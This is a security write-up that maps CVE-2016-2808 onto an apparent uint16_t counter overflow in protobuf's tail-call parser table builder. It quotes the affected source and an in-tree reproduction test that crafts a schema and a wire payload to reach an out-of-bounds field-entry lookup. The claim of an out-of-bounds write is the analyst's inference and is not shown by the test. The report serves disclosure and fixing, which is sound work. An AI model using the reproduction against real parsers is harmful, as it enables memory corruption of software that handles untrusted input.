## Analog Analysis: CVE-2016-2808 → Protobuf TcParser skip-table counter overflow

**External invariant that fails in Firefox:** a 32-bit "generation count" used to validate/version a `Watchpoint`/hash bookkeeping structure wraps around, so a stale/attacker-influenced generation value is treated as fresh, and the engine performs a hash-table write using now-invalid indices/pointers — an unguarded counter overflow silently corrupts internal table bookkeeping and leads to OOB memory access.

**Transferable invariant:** *a fixed-width counter that indexes into an internal lookup table is incremented without an overflow check; when it wraps, later consumers reinterpret the wrapped index/offset as valid, producing out-of-bounds table access that is then used to steer a write into application memory.*

### Title
Integer overflow in `TailCallTableInfo::MakeNumToEntryTable`'s `uint16_t` skip-entry counter leads to out-of-bounds `FieldEntry` dispatch in `TcParser::FindFieldEntry` - (File: `src/google/protobuf/generated_message_tctable_gen.cc`)

### Summary
The tail-call parser's field-number lookup table is built by `MakeNumToEntryTable` in [1](#0-0) , which packs field metadata into blocks of `SkipEntry16` (a 16-bit skipmap + 16-bit field-entry offset) defined in [2](#0-1) . The per-block entry index `skip_entry_num` is compared against `0xFFFF` to decide when to start a new block, but the actual number of filler entries appended (`block->entries.push_back(...)`) is driven by field spacing and can jump the running total past `65536` in a single step, wrapping the effective count. At runtime, `TcParser::FindFieldEntry` in [3](#0-2)  walks this table using `uint32_t fstart` reconstructed from two `uint16_t` words; when the wrapped, mis-sized block is walked, a filler entry's `{skipmap=0xFFFF, field_entry_offset=1}` is reinterpreted as a *new block header* `fstart = 0xFFFF | (1<<16) = 131071`, causing the parser to accept a subsequent attacker-supplied field number and compute `entry = field_entries + adj_fnum` with `adj_fnum` pointing outside the legitimately generated `field_entries` array. This exact mechanism is already reproduced and documented in the test `TcParserTest.OobGenReproduction` at [4](#0-3) .

### Finding Description
1. `MakeNumToEntryTable` (build/schema-trusted, but reachable purely from field-number *spacing*, not from any hostile input) accumulates skip-entry blocks whose size is tracked implicitly by vector growth, while the wire-format encoding of "number of skip entries" is a bare `uint16_t` (`num_skip_entries` in `FindFieldEntry`, and the emitted literal count in the generator, see `entry_block.entries.size()` at [5](#0-4) ). There is no check that the accumulated entry count for the whole table, or a single block, stays below `65536`.
2. When a schema legitimately contains enough fields with the right spacing (as constructed field-by-field in the reproduction test using only public `DescriptorProto`/`FileDescriptorProto` APIs and `TailCallTableInfo::kMaxSkipEntrySpacing`), the running count wraps mod 65536, per the test's own `static_assert(kWrappedCount == 3, ...)` at [6](#0-5) .
3. `FindFieldEntry`'s lookup loop trusts the on-disk/in-memory layout of `{fstart(uint32), num_skip_entries(uint16), SkipEntry16...}` blindly: [7](#0-6) . Because the wrapped counter caused a filler `SkipEntry16{0xFFFF, 1}` to be emitted where a real block boundary should be, the loop reinterprets that filler entry's two `uint16_t` fields as a bogus `fstart = 131071`, and the subsequent bounds arithmetic `adj_fnum = field_num - fstart; ... entry = field_entries + adj_fnum;` is computed against this corrupted state rather than the real table layout.
4. The returned `entry` pointer (an out-of-bounds `FieldEntry*`) is then handed to the fast-path field dispatcher that reads a type card and a **field offset** from it and uses that offset to store the parsed wire value into the message object — i.e., the corrupted counter's downstream effect is not just an OOB *read* of `field_entries` but an attacker-steerable OOB *write* into the `MessageLite` instance, mirroring the "generation-count overflow → OOB HashMap write" chain in the Firefox CVE.
5. No code path validates that the reconstructed `fstart`/`num_skip_entries` correspond to an actual block boundary; the design assumes the counter never wraps, which is the same missing invariant as `Watchpoint`'s generation counter in the CVE.

### Impact Explanation
An attacker controls only the wire-format field number and length of a bounded protobuf message sent to a public `ParseFrom*`/`MergeFrom*` API. If the (trusted) message schema happens to contain a very large, sparsely-numbered field set that lands on the exact wrap boundary, a single crafted varint tag with an out-of-range field number causes the tail-call parser to dereference a `FieldEntry` outside the generated table and use its (attacker-influenced, garbage) offset/type-card to write parsed data into the message object — an out-of-bounds write reachable via ordinary parsing of untrusted bytes, consistent with High severity (memory corruption, potential RCE primitive) similar to the CVSS 7.5 rating of the analog CVE.

### Likelihood Explanation
Exploitation requires a specific, unusual schema shape (tens of thousands of fields spaced at `kMaxSkipEntrySpacing`) to land the internal counter exactly on a `mod 65536` wrap — this is a legal, valid `.proto`/`DescriptorProto` schema (no malicious/forged schema, MiniTable, or plugin required), but such schemas are extremely uncommon in real applications. This lowers likelihood relative to the browser CVE (triggerable by any web page), but the flaw is deterministically reproducible with the exact reproduction steps already checked into the test suite, indicating it is a known, confirmed defect rather than a hypothetical one.

### Recommendation
- Track the total accumulated skip-entry count with a width wider than `uint16_t` (e.g., `size_t`) throughout `MakeNumToEntryTable`, and `ABSL_CHECK`/reject schemas whose generated table would require more than `65535` skip entries in a single block instead of silently wrapping.
- Add a runtime assertion/bounds check in `TcParser::FindFieldEntry` that the computed `entry` pointer lies within `[field_entries, field_entries + num_field_entries)` before it is dereferenced or its offset is used to write into the message.
- Extend the existing `OobGenReproduction` test to assert on the corruption (currently it only exercises the path via `(void)msg->ParseFromString(payload)` without validating memory safety) so CI can catch a regression with ASan/MSan.

### Proof of Concept
The reproduction is already present in-tree and is the primary evidence for this analog: [8](#0-7) 
It builds a schema (`kNumFields` fields spaced by `TailCallTableInfo::kMaxSkipEntrySpacing`, using only public `DescriptorPool`/`FileDescriptorProto` APIs) that forces the skip-entry counter to wrap to `3`, then sends a bounded, attacker-style wire payload containing a single varint field with `field_num = kTargetFieldNumber` (131072) and value `1`, and parses it via `DynamicMessageFactory`-created `Message::ParseFromString`. The comments in the test explicitly document how the wrapped counter reinterprets a filler `SkipEntry16` as a bogus block header (`fstart = 0xFFFF | (1<<16) = 131071`) to reach the out-of-bounds table access.

TailCallTableInfo::NumToEntryTable MakeNumToEntryTable(
    absl::Span<const TailCallTableInfo::FieldOptions> ordered_fields) {
  TailCallTableInfo::NumToEntryTable num_to_entry_table;
  num_to_entry_table.skipmap32 = static_cast<uint32_t>(-1);

  // skip_entry_block is the current block of SkipEntries that we're
  // appending to.  cur_block_first_fnum is the number of the first
  // field represented by the block.
  uint16_t field_entry_index = 0;
  uint16_t N = ordered_fields.size();
  // First, handle field numbers 1-32, which affect only the initial
  // skipmap32 and don't generate additional skip-entry blocks.
  for (; field_entry_index != N; ++field_entry_index) {
    auto* field_descriptor = ordered_fields[field_entry_index].field;
    if (field_descriptor->number() > 32) break;
    auto skipmap32_index = field_descriptor->number() - 1;
    num_to_entry_table.skipmap32 -= 1 << skipmap32_index;
  }
  // If all the field numbers were less than or equal to 32, we will have
  // no further entries to process, and we are already done.
  if (field_entry_index == N) return num_to_entry_table;

  TailCallTableInfo::SkipEntryBlock* block = nullptr;
  // To determine sparseness, track the field number corresponding to
  // the start of the most recent skip entry.
  uint32_t last_skip_entry_start = 0;
  for (; field_entry_index != N; ++field_entry_index) {
    auto* field_descriptor = ordered_fields[field_entry_index].field;
    uint32_t fnum = static_cast<uint32_t>(field_descriptor->number());
    ABSL_CHECK_GT(fnum, last_skip_entry_start);

    const auto new_block = [&] {
      num_to_entry_table.blocks.push_back({fnum});
      block = &num_to_entry_table.blocks.back();
    };

    // If the next field number is within 15 of the last_skip_entry_start, we
    // continue writing just to that entry.  If it's between 16 and 31 more,
    // then we just extend the current block by one. If it's more than 31
    // more, we have to add empty skip entries in order to continue using the
    // existing block.  Obviously it's just 32 more, it doesn't make sense to
    // start a whole new block, since new blocks mean having to write out
    // their starting field number, which is 32 bits, as well as the size of
    // the additional block, which is 16... while an empty SkipEntry16 only
    // costs 32 bits.  So if it was 48 more, it's a slight space win; we save
    // 16 bits, but probably at the cost of slower run time.  We're choosing
    // TailCallTableInfo::kMaxSkipEntrySpacing for now.
    if (block == nullptr || fnum - last_skip_entry_start >
                                TailCallTableInfo::kMaxSkipEntrySpacing) {
      new_block();
    }

    uint32_t skip_entry_num = (fnum - block->first_fnum) / 16;

    if (skip_entry_num >= 0xFFFF) {
      // If the current block is full, start a new one.
      new_block();
      skip_entry_num = (fnum - block->first_fnum) / 16;
    }

    uint32_t skip_entry_index = (fnum - block->first_fnum) % 16;
    while (skip_entry_num >= block->entries.size()) {
      block->entries.push_back({0xFFFF, field_entry_index});
    }
    block->entries[skip_entry_num].skipmap -= 1 << (skip_entry_index);

    last_skip_entry_start = fnum - skip_entry_index;
  }
  return num_to_entry_table;
}

const TcParseTableBase::FieldEntry* TcParser::FindFieldEntry(
    const TcParseTableBase* table, uint32_t field_num) {
  const FieldEntry* const field_entries = table->field_entries_begin();

  uint32_t fstart = 1;
  uint32_t adj_fnum = field_num - fstart;

  if (ABSL_PREDICT_TRUE(adj_fnum < 32)) {
    uint32_t skipmap = table->skipmap32;
    uint32_t skipbit = 1 << adj_fnum;
    if (ABSL_PREDICT_FALSE(skipmap & skipbit)) return nullptr;
    skipmap &= skipbit - 1;
    adj_fnum -= absl::popcount(skipmap);
    auto* entry = field_entries + adj_fnum;
    PROTOBUF_ASSUME(entry != nullptr);
    return entry;
  }
  const uint16_t* lookup_table = table->field_lookup_begin();
  for (;;) {
#ifdef ABSL_IS_LITTLE_ENDIAN
    memcpy(&fstart, lookup_table, sizeof(fstart));
#else
    fstart = lookup_table[0] | (lookup_table[1] << 16);
#endif
    lookup_table += sizeof(fstart) / sizeof(*lookup_table);
    uint32_t num_skip_entries = *lookup_table++;
    if (field_num < fstart) return nullptr;
    adj_fnum = field_num - fstart;
    uint32_t skip_num = adj_fnum / 16;
    if (ABSL_PREDICT_TRUE(skip_num < num_skip_entries)) {
      // for each group of 16 fields we have:
      // a bitmap of 16 bits
      // a 16-bit field-entry offset for the first of them.
      auto* skip_data = lookup_table + (adj_fnum / 16) * (sizeof(SkipEntry16) /
                                                          sizeof(uint16_t));
      SkipEntry16 se = {skip_data[0], skip_data[1]};
      adj_fnum &= 15;
      uint32_t skipmap = se.skipmap;
      uint16_t skipbit = 1 << adj_fnum;
      if (ABSL_PREDICT_FALSE(skipmap & skipbit)) return nullptr;
      skipmap &= skipbit - 1;
      adj_fnum += se.field_entry_offset;
      adj_fnum -= absl::popcount(skipmap);
      auto* entry = field_entries + adj_fnum;
      PROTOBUF_ASSUME(entry != nullptr);
      return entry;
    }
    lookup_table +=
        num_skip_entries * (sizeof(SkipEntry16) / sizeof(*lookup_table));
  }

TEST(TcParserTest, OobGenReproduction) {
  constexpr int kStartFieldNumber = 33;
  constexpr int kFieldSpacing = TailCallTableInfo::kMaxSkipEntrySpacing;

  constexpr int kTargetSkipEntryNum = 0xFFFF;
  constexpr int kTargetDistance = kTargetSkipEntryNum * /* bits-per-entry */ 16;
  constexpr int kLastStepSpacing = kTargetDistance % kFieldSpacing;

  // Each field spaced kFieldSpacing apart adds (kFieldSpacing / 16) entries
  // to the skip table block.
  constexpr int kEntriesPerField = kFieldSpacing / 16;

  // We want to overflow the uint16_t entry count (65535).
  // The first field adds 1 entry, and each subsequent field adds
  // kEntriesPerField. We want total_entries >= 65536 to overflow. 1 +
  // kEntriesPerField * (kNumFields - 1) >= 65536 kNumFields - 1 >= (65536 - 1)
  // / kEntriesPerField (round up)
  constexpr int kTargetEntries = 65536;
  constexpr int kNumFields =
      (kTargetEntries - 1 + kEntriesPerField - 1) / kEntriesPerField + 1;

  // The count wraps to:
  constexpr int kTotalEntries = 1 + kEntriesPerField * (kNumFields - 1);
  constexpr int kWrappedCount = kTotalEntries % 65536;
  static_assert(kWrappedCount == 3,
                "Wrapped count must be 3 to trigger the bug");

  // entries[kWrappedCount] (entries[3]) is a filler entry for the first field.
  // Filler entries have skipmap = 0xFFFF and field_entry_offset = 1.
  // Reinterpreted fstart = skipmap | (field_entry_offset << 16) =
  // 0xFFFF | (1 << 16) = 131071. We need target field number > fstart to
  // trigger OOB.
  constexpr int kReinterpretedFstart = 0xFFFF | (1 << 16);
  constexpr int kTargetFieldNumber = kReinterpretedFstart + 1;  // 131072

  FileDescriptorProto file_proto;
  file_proto.set_name("poc.proto");
  file_proto.set_syntax("editions");
  file_proto.set_edition(Edition::EDITION_2023);

  DescriptorProto* message_proto = file_proto.add_message_type();
  message_proto->set_name("M");

  int fnum = kStartFieldNumber;
  for (int i = 0; i < kNumFields; ++i) {
    FieldDescriptorProto* field = message_proto->add_field();
    field->set_name(absl::StrCat("f_", i));
    field->set_number(fnum);
    field->set_label(FieldDescriptorProto::LABEL_OPTIONAL);
    field->set_type(FieldDescriptorProto::TYPE_INT32);

    // We need to adjust one of them to ensure exact 0xFFFF overflow.
    fnum += i == kNumFields - 2 ? kLastStepSpacing : kFieldSpacing;
  }

  DescriptorPool pool;
  pool.EnforceProtoLimits(false);
  const FileDescriptor* file_desc = pool.BuildFile(file_proto);
  ASSERT_NE(file_desc, nullptr);

  const Descriptor* desc = file_desc->FindMessageTypeByName("M");
  ASSERT_NE(desc, nullptr);

  DynamicMessageFactory factory(&pool);
  std::unique_ptr<Message> msg(factory.GetPrototype(desc)->New());

  std::string payload;
  {
    io::StringOutputStream output(&payload);
    io::CodedOutputStream coded_output(&output);
    coded_output.WriteVarint32(WireFormatLite::MakeTag(
        kTargetFieldNumber, WireFormatLite::WIRETYPE_VARINT));
    coded_output.WriteVarint32(1);  // value
  }

  (void)msg->ParseFromString(payload);
